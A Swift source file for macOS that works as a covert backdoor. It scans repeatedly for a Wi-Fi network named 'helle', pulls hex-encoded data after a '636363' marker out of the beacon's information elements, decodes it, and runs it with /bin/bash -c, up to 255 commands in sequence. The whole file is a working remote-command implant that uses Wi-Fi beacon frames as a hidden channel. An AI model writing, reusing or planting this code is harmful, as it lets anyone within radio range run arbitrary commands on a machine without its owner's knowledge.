//
//  main.swift
//  gt
//
//  Created by JcQ~ on 2018/5/24.
//  Copyright © 2018 金灿权. All rights reserved.
//

import Foundation
import CoreWLAN

func changeToInt(num:String) -> Character {
    let str = num.uppercased()
    
    var sum = 0
    
    for i in str.utf8 {
        
        sum = sum * 16 + Int(i) - 48 // 0-9 从48开始
        
        if i >= 65 {
            sum -= 7
        }
    }
    let ch:Character=Character(UnicodeScalar(sum)!)
    return ch
}

extension String {
    //返回第一次出现的指定子字符串在此字符串中的索引
    //（如果backwards参数设置为true，则返回最后出现的位置）
    func positionOf(sub:String, backwards:Bool = false)->Int {
        var pos = -1
        if let range = range(of:sub, options: backwards ? .backwards : .literal ) {
            if !range.isEmpty {
                pos = self.distance(from:startIndex, to:range.lowerBound)
            }
        }
        return pos
    }
}

func hexToStr(str:String)-> String{
    var c_str:[Character]=[]
    var tmp:[Character]=[]
    for c in str{
        tmp.append(c)
        if tmp.count == 2{
            let c = changeToInt(num: String(tmp))
            c_str.append(c)
            tmp.removeAll()
        }
    }
    return String(c_str)
}

func hexTodec(number num:String) -> Int {
    let str = num.uppercased()
    var sum = 0
    for i in str.utf8 {
        sum = sum * 16 + Int(i) - 48 // 0-9 从48开始
        if i >= 65 {                 // A-Z 从65开始，但有初始值10，所以应该是减去55
            sum -= 7
        }
    }
    return sum
}

var client=CWWiFiClient()
var itf=client?.interface()
var raw_data=""
var test=CWNetwork()
var prefix_shell=0
while 1==1{
    try
        itf?.scanForNetworks(withName: "helle")
    let cache=itf?.cachedScanResults()

    for i in cache!{
        test=i
    }
    //查看是否有目标ssid的帧
    if(test.ssid==nil){
//        print("cant find ")
        continue
    }else{
        //对接收到的帧进行数据整合
        let da=test.informationElementData
        for i in da!{
            let hex=String(format:"%02x",i)
            raw_data=raw_data+hex
        }
        //查询是否为目标帧
        let flag=raw_data.range(of: "636363")
        if(flag==nil){
//            print("cant find ")
            continue
        }else{
            //获取magic字段位置
//            print("find")
            let shell_pos=raw_data.positionOf(sub: "636363")
            //获取shell长度（负号）
            let sub_length = 0 - raw_data.characters.count + shell_pos + 8
            //判断shell是否为同一条
            let shell_pre_start_index=raw_data.index(raw_data.endIndex,offsetBy:sub_length-10)
            let shell_pre_end_index=raw_data.index(raw_data.endIndex,offsetBy:sub_length-8)
//            print(raw_data)
//            print(String(raw_data[shell_pre_start_index..<shell_pre_end_index]))
            let shell_pre=hexTodec(number: String(raw_data[shell_pre_start_index..<shell_pre_end_index]))
            print(shell_pre)
            
            print(prefix_shell)
            if shell_pre == prefix_shell{
                print("done")
                //如果不是同一条shell，则对接收到的数据进行处理，获取shell
                let start_index=raw_data.index(raw_data.endIndex,offsetBy:sub_length-2)
                let end_index=raw_data.index(raw_data.endIndex,offsetBy:0)
                let fix_data = String(raw_data[start_index..<end_index])
                print(fix_data)
                let shell=hexToStr(str: fix_data)
                //对截取到的shell进行执行
                print(shell)
                let task=Process()
                task.launchPath="/bin/bash"
                task.arguments=["-c",shell]
                task.launch()
                prefix_shell=prefix_shell+1
                
                if prefix_shell==255{
                    print("Max command done.All clear")
                    break
                }
//                break
            }

        }
//        break
    }
}


